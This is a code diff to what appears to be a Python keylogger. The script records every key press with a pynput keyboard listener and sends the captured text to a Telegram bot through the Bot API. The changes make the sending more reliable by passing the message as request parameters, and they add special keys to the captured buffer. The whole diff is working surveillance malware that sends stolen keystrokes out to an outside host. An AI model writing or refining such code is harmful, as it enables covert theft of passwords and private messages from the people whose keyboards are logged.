@@ -10,12 +10,17 @@ def send_telegram_message(message):
     if not message.strip():
         return
     try:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
-        response = requests.get(url)
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        params = {
+            'chat_id': CHAT_ID,
+            'text': message
+        }
+        response = requests.get(url, params=params)
         response.raise_for_status()
         print(f"Message sent: {message}")
     except Exception as e:
         print(f"Error sending message: {e}")
+
 
 def on_press(key):
     global real_word
@@ -35,6 +40,7 @@ def on_press(key):
             # Handle backspace
             real_word = real_word[:-1]
         else:
+            real_word += str(key)
             print(f"Special key: {key}")
 
 def on_release(key):
@@ -48,4 +54,4 @@ with keyboard.Listener(
     on_press=on_press,
     on_release=on_release
 ) as listener:
-    listener.join()
+    listener.join()
